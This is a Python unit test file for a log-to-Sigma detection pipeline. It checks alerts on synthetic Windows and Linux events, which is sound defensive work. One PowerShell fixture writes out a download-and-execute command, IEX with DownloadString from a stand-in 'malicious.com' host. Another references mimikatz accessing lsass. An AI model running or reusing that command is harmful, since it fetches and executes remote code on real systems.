import sys
import os
import unittest
import yaml
# Add src to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../src')))

from mappers.otel_mapper import OtelMapper
from detection.sigma_engine import SigmaEngine

class TestBasicFlow(unittest.TestCase):
    def setUp(self):
        mappings_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../config/field_mappings.yaml'))
        with open(mappings_path, 'r') as f:
            self.mappings = yaml.safe_load(f)
        self.mapper = OtelMapper(self.mappings)
        
        # Mock Engine Config
        self.engine_config = {'rules_path': 'dummy', 'severity_filter': ['high', 'critical']}
        self.engine = SigmaEngine(self.engine_config)

    def test_failed_login_detection(self):
        # Simulator a raw log from ClickHouse (SigNoz logs_v2 schema)
        raw_log = {
            'timestamp': 1698422400000000000, # Nanoseconds
            'severity_text': 'WARN',
            'body': '{"EventID": 4625, "Channel": "Security", "EventData": {"TargetUserName": "testuser", "IpAddress": "192.168.1.100", "FailureReason": "Bad password"}}',
            'attributes_string': {},
            'attributes_number': {},
            'attributes_bool': {},
            'resources_string': {'service.name': 'windows-security', 'host.name': 'production-server-1', 'os.type': 'windows'}
        }
        
        # 1. Map
        mapped = self.mapper.map_to_sigma(raw_log)
        
        print(f"Mapped Log: {mapped}")
        
        self.assertEqual(mapped.get('EventID'), 4625)
        self.assertEqual(mapped.get('Computer'), 'production-server-1')

        # 2. Evaluate
        alerts = self.engine.evaluate([mapped])
        
        print(f"Alerts: {alerts}")
        
        self.assertTrue(len(alerts) > 0)
        self.assertEqual(alerts[0]['rule_title'], 'Failed Login Attempt')

    def test_suspicious_powershell_detection(self):
        raw_log = {
            'timestamp': 1698422400000000001,
            'severity_text': 'ERROR',
            'body': '{"EventID": 4104, "Channel": "Microsoft-Windows-PowerShell/Operational", "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString(\\"http://malicious.com/payload.ps1\\")", "Path": "C:\\\\Users\\\\admin\\\\malicious.ps1"}',
            'attributes_string': {},
            'attributes_number': {},
            'attributes_bool': {},
            'resources_string': {'service.name': 'windows-powershell', 'host.name': 'workstation-1', 'os.type': 'windows'}
        }

        mapped = self.mapper.map_to_sigma(raw_log)
        alerts = self.engine.evaluate([mapped])

        self.assertTrue(len(alerts) > 0)
        self.assertEqual(alerts[0]['rule_title'], 'Suspicious PowerShell Activity')

    def test_mimikatz_detection(self):
        raw_log = {
            'timestamp': 1698422400000000002,
            'severity_text': 'CRITICAL',
            'body': '{"EventID": 10, "Channel": "Microsoft-Windows-Sysmon/Operational", "EventData": {"SourceImage": "C:\\\\Users\\\\admin\\\\mimikatz.exe", "TargetImage": "C:\\\\Windows\\\\System32\\\\lsass.exe", "GrantedAccess": "0x1010"}}',
            'attributes_string': {},
            'attributes_number': {},
            'attributes_bool': {},
            'resources_string': {'service.name': 'windows-security', 'host.name': 'victim-pc', 'os.type': 'windows'}
        }

        mapped = self.mapper.map_to_sigma(raw_log)
        alerts = self.engine.evaluate([mapped])

        self.assertTrue(len(alerts) > 0)
        self.assertEqual(alerts[0]['rule_title'], 'Possible Credential Dumping (LSASS Access)')

    def test_privilege_escalation_detection(self):
        raw_log = {
            'timestamp': 1698422400000000003,
            'severity_text': 'ERROR',
            'body': '{"EventID": 4728, "Channel": "Security", "EventData": {"MemberName": "user1", "TargetUserName": "Administrators", "SubjectUserName": "admin"}}',
            'attributes_string': {},
            'attributes_number': {},
            'attributes_bool': {},
            'resources_string': {'service.name': 'windows-security', 'host.name': 'dc-1', 'os.type': 'windows'}
        }

        mapped = self.mapper.map_to_sigma(raw_log)
        alerts = self.engine.evaluate([mapped])

        self.assertTrue(len(alerts) > 0)
        self.assertEqual(alerts[0]['rule_title'], 'Privilege Escalation (Group Membership Change)')

    def test_lateral_movement_detection(self):
        raw_log = {
            'timestamp': 1698422400000000004,
            'severity_text': 'WARN',
            'body': '{"EventID": 4624, "Channel": "Security", "EventData": {"TargetUserName": "admin1", "IpAddress": "10.0.0.1", "LogonType": "3", "AuthenticationPackageName": "NTLM"}}',
            'attributes_string': {},
            'attributes_number': {},
            'attributes_bool': {},
            'resources_string': {'service.name': 'windows-security', 'host.name': 'server-1', 'os.type': 'windows'}
        }

        mapped = self.mapper.map_to_sigma(raw_log)
        alerts = self.engine.evaluate([mapped])

        self.assertTrue(len(alerts) > 0)
        self.assertEqual(alerts[0]['rule_title'], 'Potential Lateral Movement (NTLM Logon)')

    def test_linux_mapping_message_from_journald(self):
        raw_log = {
            'timestamp': 1698422400000000100,
            'severity_text': '',
            'body': '{"MESSAGE": "hello from journald", "PRIORITY": "4", "SYSLOG_IDENTIFIER": "kernel"}',
            'attributes_string': {},
            'attributes_number': {},
            'attributes_bool': {},
            'resources_string': {'host.name': 'linux-host-1', 'os.type': 'linux'}
        }

        mapped = self.mapper.map_to_sigma(raw_log)
        self.assertEqual(mapped.get('_source_type'), 'linux')
        self.assertEqual(mapped.get('hostname'), 'linux-host-1')
        self.assertEqual(mapped.get('message'), 'hello from journald')
        self.assertEqual(mapped.get('severity'), '4')
        self.assertEqual(mapped.get('source'), 'kernel')

    def test_linux_mapping_message_from_plain_body(self):
        raw_log = {
            'timestamp': 1698422400000000200,
            'severity_text': 'WARN',
            'body': 'plain log line',
            'attributes_string': {},
            'attributes_number': {},
            'attributes_bool': {},
            'resources_string': {'host.name': 'linux-host-2', 'os.type': 'linux'}
        }

        mapped = self.mapper.map_to_sigma(raw_log)
        self.assertEqual(mapped.get('_source_type'), 'linux')
        self.assertEqual(mapped.get('hostname'), 'linux-host-2')
        self.assertEqual(mapped.get('message'), 'plain log line')
        self.assertEqual(mapped.get('severity'), 'WARN')

if __name__ == '__main__':
    unittest.main()
